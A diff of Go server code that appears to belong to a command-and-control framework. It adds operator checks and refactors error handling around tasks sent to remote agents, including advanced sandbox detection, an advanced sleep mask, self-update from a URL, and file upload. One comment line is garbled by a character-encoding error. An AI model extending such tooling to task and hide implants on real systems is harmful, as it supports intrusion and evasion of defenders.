+		respondError(c, http.StatusInternalServerError, "failed to create task")
+		return
+	}
+	slog.Info("Advanced sandbox detection requested", "agent", id)
+	s.LogAuditRecord(c, "sandbox_detect_advanced", "agent", id, "Advanced sandbox detection requested", true, nil)
+	s.dispatchTask(c, task, "sandbox_detect_advanced", "Advanced Sandbox Detection")
+}
+
+func (s *Server) handleSetSleepMaskAdvanced(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
+	id := c.Param("id")
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+	task, err := s.createTask(id, "set_sleep_mask_advanced", "", "", "", "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create set_sleep_mask_advanced task", "agent_id", id, "error", err)
+		respondError(c, http.StatusInternalServerError, "failed to create task")
+		return
+	}
+	slog.Info("Advanced sleep mask requested", "agent", id)
+	s.LogAuditRecord(c, "set_sleep_mask_advanced", "agent", id, "Advanced sleep mask activation requested", true, nil)
+	s.dispatchTask(c, task, "set_sleep_mask_advanced", "Advanced Sleep Mask")
+}
+
 // 鈹€鈹€ Self-Update 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 
 func (s *Server) handleSelfUpdate(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	url := c.PostForm("url")
 	if url == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "download URL is required"})
+		respondError(c, http.StatusBadRequest, "download URL is required")
 		return
 	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
@@ -905,7 +1069,7 @@ func (s *Server) handleSelfUpdate(c *gin.Context) {
 	task, err := s.createTask(id, "self_update", url, "", "", "", 0, 0)
 	if err != nil {
 		slog.Error("Failed to create self_update task", "agent_id", id, "error", err)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 	slog.Info("Self-update requested", "agent", id, "url", url)
@@ -922,13 +1086,16 @@ type simpleTaskDef struct {
 
 // createSimpleTask creates and dispatches a parameterless agent task
 func (s *Server) createSimpleTask(c *gin.Context, id string, def simpleTaskDef) bool {
+	if !s.requireOperator(c) {
+		return false
+	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return false
 	}
 	task, err := s.createTask(id, def.taskType, "", "", "", "", 0, 0)
 	if err != nil {
 		slog.Error("Failed to create task", "type", def.taskType, "agent_id", id, "error", err)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return false
 	}
 	slog.Info(def.taskType+" requested", "agent", id)
@@ -941,22 +1108,22 @@ func (s *Server) createSimpleTask(c *gin.Context, id string, def simpleTaskDef) 
 func (s *Server) handleFileUpload(c *gin.Context, fieldName string) (filename, b64Data string, size int64, ok bool) {
 	file, err := c.FormFile(fieldName)
 	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": fieldName + " file required"})
+		respondError(c, http.StatusBadRequest, fieldName + " file required")
 		return
 	}
 	if file.Size > MaxUploadSize {
-		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("file too large: %d bytes (max %d)", file.Size, MaxUploadSize)})
+		respondError(c, http.StatusBadRequest, fmt.Sprintf("file too large: %d bytes (max %d)", file.Size, MaxUploadSize))
 		return
 	}
 	f, err := file.Open()
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read " + fieldName})
+		respondError(c, http.StatusInternalServerError, "failed to read " + fieldName)
 		return
 	}
 	defer f.Close()
 	data, err := io.ReadAll(f)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read " + fieldName + " data"})
+		respondError(c, http.StatusInternalServerError, "failed to read " + fieldName + " data")
 		return
 	}
 	filename = file.Filename
